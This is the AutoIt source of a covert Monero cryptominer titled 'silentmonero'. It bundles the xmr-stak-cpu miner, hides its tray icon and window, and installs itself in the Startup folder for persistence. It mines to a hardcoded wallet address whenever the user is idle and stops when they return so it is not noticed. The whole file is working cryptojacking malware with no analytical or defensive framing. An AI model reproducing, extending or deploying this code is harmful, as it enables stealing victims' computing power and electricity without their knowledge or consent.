#NoTrayIcon
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_UseX64=y
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#include <Timers.au3>
#include <WinAPIFiles.au3>
#include <MsgBoxConstants.au3>
#include <Process.au3>
#include <Inet.au3>
#include <File.au3>
#include '_Startup.au3'

; Prevent duplicate processes
$window_title = "silentmonero"
If WinExists($window_title) Then Exit;
AutoItWinSetTitle($window_title)

; Miner Files
FileInstall("xmr-stak-cpu.exe", @ScriptDir & "\xmr-stak-cpu.exe", 0)
FileInstall("conf.txt", @ScriptDir & "\conf.txt", 0)

; Add the running EXE to the Current User startup folder.
_StartupFolder_Install()

; Settings
; Pool
$pool = IniRead(@ScriptDir & "\conf.txt", "settings", "pool", "supportxmr.com:3333")
; Address
$address = IniRead(@ScriptDir & "\conf.txt", "settings", "address", "45hFtBX393vPo8u5HoeK1EHrGWxVmFPPJGYH515bktZyEacp3osHA4XK58NEAV4XLr9RB1UM2321rKBAindWhBnKEXLUdTW")
; Password
$password = IniRead(@ScriptDir & "\conf.txt", "settings", "password", "x")
; Worker ID (none, ip, compname, custom_string)
$worker_id = IniRead(@ScriptDir & "\conf.txt", "settings", "worker_id", "off")
; Worker ID Location (address or password)
$worker_id_location = IniRead(@ScriptDir & "\conf.txt", "settings", "worker_id_location", "address")
; Difficulty
$difficulty = IniRead(@ScriptDir & "\conf.txt", "settings", "difficulty", "off")

; Advanced
; Idle time before start (In Seconds)
$idle = 1000 * IniRead(@ScriptDir & "\conf.txt", "advanced", "idle_time_before_start", "30")
; show / hide window ( true, false )
$hide = IniRead(@ScriptDir & "\conf.txt", "advanced", "hide_window", "true")
; 64 bit miner name.
$x64file = IniRead(@ScriptDir & "\conf.txt", "advanced", "x64_miner_name", "xmr-stak-cpu.exe")
; Process type (idle_on, always_on)
$ptype = IniRead(@ScriptDir & "\conf.txt", "advanced", "process", "idle_on")
; Set miner process prioriy
$process_priority = IniRead(@ScriptDir & "\conf.txt", "advanced", "process_priority", "2")
; Set low power mode (true, false)
$low_power_mode = IniRead(@ScriptDir & "\conf.txt", "advanced", "low_power_mode", "false")
; Set no prefetch (true, false)
$no_prefetch = IniRead(@ScriptDir & "\conf.txt", "advanced", "no_prefetch", "true")
; Set affinity (true, false)
$affine_to_cpu = IniRead(@ScriptDir & "\conf.txt", "advanced", "affine_to_cpu", "true")
; Numbers of threads to use. (all, half, custom integer)
$threads = IniRead(@ScriptDir & "\conf.txt", "advanced", "threads", "half")
; Use slow memory ( always, warn, never )
$use_slow_memory = IniRead(@ScriptDir & "\conf.txt", "advanced", "use_slow_memory", "warn")
; NiceHash Mode ( true, false )
$nicehash_nonce = IniRead(@ScriptDir & "\conf.txt", "advanced", "nicehash_nonce", "false")
; Use TLS? ( true, false )
$use_tls = IniRead(@ScriptDir & "\conf.txt", "advanced", "use_tls", "false")
; Require secure algorithms ( true, false )
$tls_secure_algo = IniRead(@ScriptDir & "\conf.txt", "advanced", "tls_secure_algo", "true")
; TLS Fingerprint ( SHA256 string )
$tls_fingerprint = IniRead(@ScriptDir & "\conf.txt", "advanced", "tls_fingerprint", "")
; Time to wait for server response ( seconds )
$call_timeout = IniRead(@ScriptDir & "\conf.txt", "advanced", "call_timeout", "10")
; Time between try to reconnect ( seconds )
$retry_time = IniRead(@ScriptDir & "\conf.txt", "advanced", "retry_time", "10")
; How many times to try to reconnect. 0 = No Limit ( integer )
$giveup_limit = IniRead(@ScriptDir & "\conf.txt", "advanced", "giveup_limit", "0")
; Verbose Level ( 0, 1, 2, 3, 4 )
$verbose_level = IniRead(@ScriptDir & "\conf.txt", "advanced", "verbose_level", "4")
; Time between hashrate reports ( seconds )
$h_print_time = IniRead(@ScriptDir & "\conf.txt", "advanced", "h_print_time", "60")
; Output File Location
$output_file = IniRead(@ScriptDir & "\conf.txt", "advanced", "output_file", "")
; HTTP Port ( 0 to 65536 )
$httpd_port = IniRead(@ScriptDir & "\conf.txt", "advanced", "httpd_port", "0")
; Use ipv4 or ipv6 ( true, false )
$prefer_ipv4 = IniRead(@ScriptDir & "\conf.txt", "advanced", "prefer_ipv4", "true")

; Create restart batch script
$file = fileopen (@Scriptdir & "\restart.bat" , 2)
FileWriteLine($file, "taskkill /f /im " & _ProcessGetName( @AutoItPID ) )
FileWriteLine($file, "taskkill /f /im " & $x64file )
FileWriteLine($file, "start " & _ProcessGetName( @AutoItPID ) )
fileclose($file)

; Create kill batch script
$file = fileopen (@Scriptdir & "\kill.bat" , 2)
FileWriteLine($file, "taskkill /f /im " & _ProcessGetName( @AutoItPID ) )
FileWriteLine($file, "taskkill /f /im " & $x64file )
fileclose($file)

; Get IP address
$ip = StringRegExpReplace( _GetIP(), "[^0-9s]", "")

; Set Worker
Switch $worker_id
    Case "off"
        $worker = ""
		$pworker = ""
    Case "ip"
        $worker = "." & $ip
		$pworker = $ip
    Case "compname"
        $worker = "." & @ComputerName
		$pworker = @ComputerName
    Case Else
        $worker = "." & $worker_id
		$pworker = $worker_id
EndSwitch

; Set Difficulty
if $difficulty == "off" Then
	$diff = ""
Else
	$diff = "+" & $difficulty
EndIf

; Set Hide Switch
$hide_switch = @SW_HIDE
If $hide == "false" Then
   $hide_switch = @SW_MAXIMIZE
EndIf

; Assemble Config
; Construct cpu_threads_conf Parameter
$cpu_threads_conf = construct_cpu_threads_conf( $low_power_mode, $no_prefetch, $affine_to_cpu, $threads ) & @CRLF
; Construct use_slow_memory parameter
$use_slow_memory_conf = '"use_slow_memory" : "' & $use_slow_memory & '",' & @CRLF
; Construct nicehash_nonce parameter
$nicehash_nonce_conf = '"nicehash_nonce" : ' & $nicehash_nonce & ',' & @CRLF
; Construct parameter_name parameter
$use_tls_conf = '"use_tls" : ' & $use_tls & ',' & @CRLF
; Construct parameter_name parameter
$tls_secure_algo_conf = '"tls_secure_algo" : ' & $tls_secure_algo & ',' & @CRLF
; Construct parameter_name parameter
$tls_fingerprint_conf = '"tls_fingerprint" : "' & $tls_fingerprint & '",' & @CRLF
; Construct parameter_name parameter
$call_timeout_conf = '"call_timeout" : ' & $call_timeout & ',' & @CRLF
; Construct parameter_name parameter
$retry_time_conf = '"retry_time" : ' & $retry_time & ',' & @CRLF
; Construct parameter_name parameter
$giveup_limit_conf = '"giveup_limit" : ' & $giveup_limit & ',' & @CRLF
; Construct parameter_name parameter
$verbose_level_conf = '"verbose_level" : ' & $verbose_level & ',' & @CRLF
; Construct parameter_name parameter
$h_print_time_conf = '"h_print_time" : ' & $h_print_time & ',' & @CRLF
; Construct parameter_name parameter
$output_file_conf = '"output_file" : "' & $output_file & '",' & @CRLF
; Construct parameter_name parameter
$httpd_port_conf = '"httpd_port" : ' & $httpd_port & ',' & @CRLF
; Construct parameter_name parameter
$prefer_ipv4_conf = '"prefer_ipv4" : ' & $prefer_ipv4 & ',' & @CRLF
; Construct parameter_name parameter
$pool_address_conf = '"pool_address" : "' & $pool & '",' & @CRLF
If $worker_id_location == "address" Then
	; Construct parameter_name parameter
	$wallet_address_conf = '"wallet_address" : "' & $address & $worker & $diff & '",' & @CRLF
	; Construct parameter_name parameter
	$pool_password_conf = '"pool_password" : "' & $password & '",' & @CRLF
Else
	; Construct parameter_name parameter
	$wallet_address_conf = '"wallet_address" : "' & $address & $diff & '",' & @CRLF
	; Construct parameter_name parameter
	$pool_password_conf = '"pool_password" : "' & $pworker & $password & '",' & @CRLF
EndIf

; Set Config
$config = $cpu_threads_conf & $use_slow_memory_conf & $nicehash_nonce_conf & $use_tls_conf & $tls_secure_algo_conf & $tls_fingerprint_conf & $call_timeout_conf & $retry_time_conf & $giveup_limit_conf & $verbose_level_conf & $h_print_time_conf & $output_file_conf & $httpd_port_conf & $prefer_ipv4_conf & $pool_address_conf & $wallet_address_conf & $pool_password_conf

; Main
If $ptype == "idle_on" Then
	While 1
		Sleep(500)
		$idleTimer = _Timer_GetIdleTime()
		If $idleTimer > ($idle) Then
			start_miner ( $x64file, $config, $hide_switch, $process_priority )
		ElseIf $idleTimer < ($idle) Then
			closeprocess_if_exists($x64file)
		EndIf
	WEnd
ElseIf $ptype == "always_on" Then
	While 1
		Sleep(500)
		start_miner ( $x64file, $config, $hide_switch, $process_priority )
	WEnd
EndIf

; Helper Functions
func start_miner ( $x64file, $config, $hide_switch, $process_priority )
	If @OSArch == "X64" And Not ProcessExists($x64file) Then
		Local $config_file = _TempFile()
		FileWrite( $config_file, $config )
		FileClose( $config_file )
		Run(@ScriptDir & "\" & $x64file & " " & $config_file, "", $hide_switch)
		ProcessSetPriority( $x64file, $process_priority )
		sleep(100)
		FileDelete( $config_file )
	EndIf
EndFunc

func closeprocess_if_exists( $process )
	if ProcessExists( $process ) Then
		ProcessClose( $process)
	EndIf
EndFunc

Func _Number_Of_Processors()
    Local $count = ''
    Dim $Obj_WMIService = ObjGet('winmgmts:{impersonationLevel=impersonate}!\\' & @ComputerName & '\root\cimv2');
    If (IsObj($Obj_WMIService)) And (Not @error) Then
        Dim $Col_Items = $Obj_WMIService.ExecQuery('Select * from Win32_ComputerSystem')

        Local $Obj_Items
        For $Obj_Items In $Col_Items
            Local $count = $Obj_Items.NumberOfProcessors
        Next

        Return Number($count)
    Else
        Return 0
    EndIf
EndFunc

Func construct_cpu_threads_conf( $low_power_mode, $no_prefetch, $affine_to_cpu, $threads )
	local $thread_count = _Number_Of_Processors() * 2
	local $cpu_threads_conf = '"cpu_threads_conf" : ['
	If $affine_to_cpu == "true" Then
		If $threads == "all" Then
			For $i = 0 To ($thread_count - 1) Step 1
				$cpu_threads_conf &= '{ "low_power_mode" : ' & $low_power_mode & ', "no_prefetch" : ' & $no_prefetch & ', "affine_to_cpu" : ' & $i & ' },'
			Next
		ElseIf $threads == "half" Then
			For $i = 0 To ($thread_count - 1) Step 2
				$cpu_threads_conf &= '{ "low_power_mode" : ' & $low_power_mode & ', "no_prefetch" : ' & $no_prefetch & ', "affine_to_cpu" : ' & $i & ' },'
			Next
		Else
			For $i = 0 To ($threads - 1) Step 1
				$cpu_threads_conf &= '{ "low_power_mode" : ' & $low_power_mode & ', "no_prefetch" : ' & $no_prefetch & ', "affine_to_cpu" : ' & $i & ' },'
			Next
		EndIf
	Else
		If $threads == "all" Then
			For $i = 0 To ($thread_count - 1) Step 1
				$cpu_threads_conf &= '{ "low_power_mode" : ' & $low_power_mode & ', "no_prefetch" : ' & $no_prefetch & ', "affine_to_cpu" : false },'
			Next
		ElseIf $threads == "half" Then
			For $i = 0 To ($thread_count - 1) Step 2
				$cpu_threads_conf &= '{ "low_power_mode" : ' & $low_power_mode & ', "no_prefetch" : ' & $no_prefetch & ', "affine_to_cpu" : false },'
			Next
		Else
			For $i = 0 To ($threads - 1) Step 1
				$cpu_threads_conf &= '{ "low_power_mode" : ' & $low_power_mode & ', "no_prefetch" : ' & $no_prefetch & ', "affine_to_cpu" : false },'
			Next
		EndIf
	EndIf
	$cpu_threads_conf &= '],'
	Return $cpu_threads_conf
EndFunc